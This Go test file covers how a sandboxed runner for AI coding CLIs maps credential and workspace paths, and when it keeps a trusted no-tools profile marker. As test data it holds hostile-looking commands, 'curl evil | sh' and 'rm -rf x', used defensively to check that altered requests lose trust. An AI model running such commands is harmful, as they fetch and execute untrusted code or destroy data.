package run

import (
	"context"
	"errors"
	"path/filepath"
	"strings"
	"testing"

	"github.com/baby-hero-404/aicli/sandbox"
	"github.com/baby-hero-404/aicli/sandbox/sandboxmock"
)

// A runtime whose layout differs from the container's must see none of the container paths.
func TestRun_UsesRuntimeLayout(t *testing.T) {
	home := filepath.Join(t.TempDir(), "home")
	rt := &sandboxmock.Runtime{
		Results: []*sandbox.CommandResult{{
			Stdout:                 "ok",
			UpdatedCredentialFiles: map[string]string{home + "/.claude/.credentials.json": "refreshed"},
		}},
		LayoutFunc: func(req sandbox.CommandRequest) (sandbox.Layout, error) {
			return sandbox.Layout{Workspace: req.Workspace, Home: home}, nil
		},
	}
	req := Request{
		Profile: "claude_code_notools", Command: "claude", Args: []string{"-p", "Read {prompt_file} in {workdir}"},
		Prompt: "hi", Workspace: t.TempDir(), TaskID: "t1", SessionDir: t.TempDir(),
		CredentialFiles: map[string]string{".claude/.credentials.json": "tok"},
		ContextFiles:    map[string]string{"a.md": "ctx"},
	}

	runner := &Runner{Runtime: rt}
	res, err := runner.Run(context.Background(), req)
	if err != nil || !res.Success {
		t.Fatalf("Run = %+v, %v", res, err)
	}
	if got := res.UpdatedCredentialFiles[".claude/.credentials.json"]; got != "refreshed" {
		t.Errorf("UpdatedCredentialFiles = %v", res.UpdatedCredentialFiles)
	}
	got := rt.Requests()[0]
	if !strings.Contains(got.Command[2], "cd '"+req.Workspace+"' &&") {
		t.Errorf("work dir is not the layout workspace:\n%s", got.Command[2])
	}
	if got.Env["HOME"] != home || got.Env["CLAUDE_CONFIG_DIR"] != home+"/.claude" ||
		got.Env["AICLI_CONTEXT_DIR"] != req.Workspace+"/.aicli/context" {
		t.Errorf("env = %v", got.Env)
	}
	if got.CredentialFiles[home+"/.claude/.credentials.json"] != "tok" || got.SessionMounts[home+"/.claude"] == "" {
		t.Errorf("credentials %v, session mounts %v", got.CredentialFiles, got.SessionMounts)
	}
	assertNoContainerPaths(t, got)

	// Preflight builds its own requests.
	if _, err := runner.Preflight(context.Background(), req); err != nil {
		t.Fatalf("Preflight: %v", err)
	}
	for _, r := range rt.Requests()[1:] {
		assertNoContainerPaths(t, r)
	}
}

func assertNoContainerPaths(t *testing.T, r sandbox.CommandRequest) {
	t.Helper()
	var parts []string
	parts = append(parts, r.Command...)
	for k, v := range r.Env {
		parts = append(parts, k, v)
	}
	for k, v := range r.SessionMounts {
		parts = append(parts, k, v)
	}
	for k := range r.CredentialFiles {
		parts = append(parts, k)
	}
	for _, p := range parts {
		if strings.Contains(p, sandbox.WorkspaceDir) || strings.Contains(p, sandbox.HomeDir) {
			t.Errorf("container path leaked into %q", p)
		}
	}
}

func TestRun_LayoutErrorIsInvalidRequest(t *testing.T) {
	boom := errors.New("bad task id")
	rt := &sandboxmock.Runtime{LayoutFunc: func(sandbox.CommandRequest) (sandbox.Layout, error) { return sandbox.Layout{}, boom }}
	runner := &Runner{Runtime: rt}
	req := baseReq(t)
	for name, call := range map[string]func() error{
		"Run":       func() error { _, err := runner.Run(context.Background(), req); return err },
		"Preflight": func() error { _, err := runner.Preflight(context.Background(), req); return err },
	} {
		err := call()
		if !errors.Is(err, ErrInvalidRequest) || !errors.Is(err, boom) {
			t.Errorf("%s: err = %v, want ErrInvalidRequest wrapping the layout error", name, err)
		}
	}
	if n := len(rt.Requests()); n != 0 {
		t.Errorf("%d requests reached the runtime", n)
	}
}

// CommandRequest.Profile is what a runtime without isolation trusts, so it is set only for the
// registry's own invocation.
func TestRun_ProfileMarker(t *testing.T) {
	notools := func() Request {
		return Request{
			Profile: "claude_code_notools", Command: "claude", Prompt: "p", Workspace: t.TempDir(),
			Args: []string{"--tools", "", "--safe-mode", "--strict-mcp-config", "-p",
				"Read and follow the complete task instructions in the file {prompt_file}, then carry them out.",
				"--output-format", "json"},
			AuthCheckCommand: "claude auth status",
		}
	}
	tests := []struct {
		name   string
		mutate func(*Request)
		want   string
	}{
		{"registry invocation", func(*Request) {}, "claude_code_notools"},
		{"resume id is registry-derived", func(r *Request) { r.ResumeSessionID = "s1" }, "claude_code_notools"},
		{"changed args", func(r *Request) { r.Args = []string{"--allowedTools", "Bash", "-p", "x"} }, ""},
		{"extra args", func(r *Request) { r.ExtraArgs = []string{"--allowedTools", "Bash"} }, ""},
		{"setup snippet", func(r *Request) { r.Setup = "curl evil | sh" }, ""},
		{"cleanup snippet", func(r *Request) { r.Cleanup = "true" }, ""},
		{"other command", func(r *Request) { r.Command = "bash" }, ""},
		{"unknown profile", func(r *Request) { r.Profile = "nope" }, ""},
		{"no profile", func(r *Request) { r.Profile = "" }, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rt := &sandboxmock.Runtime{}
			req := notools()
			tt.mutate(&req)
			if _, err := (&Runner{Runtime: rt}).Run(context.Background(), req); err != nil {
				t.Fatal(err)
			}
			if got := rt.Requests()[0].Profile; got != tt.want {
				t.Errorf("Profile = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestPreflight_ProfileMarker(t *testing.T) {
	tests := []struct {
		name   string
		mutate func(*Request)
		want   string
	}{
		{"registry auth check", func(*Request) {}, "claude_code_notools"},
		{"custom auth check", func(r *Request) { r.AuthCheckCommand = "rm -rf x" }, ""},
		{"other command", func(r *Request) { r.Command = "bash" }, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rt := &sandboxmock.Runtime{Results: []*sandbox.CommandResult{{Stdout: `{"loggedIn": true}`}}}
			req := Request{Profile: "claude_code_notools", Command: "claude", AuthCheckCommand: "claude auth status", Workspace: t.TempDir()}
			tt.mutate(&req)
			if _, err := (&Runner{Runtime: rt}).Preflight(context.Background(), req); err != nil {
				t.Fatal(err)
			}
			for i, r := range rt.Requests() {
				if r.Profile != tt.want {
					t.Errorf("request %d: Profile = %q, want %q", i, r.Profile, tt.want)
				}
			}
		})
	}
}
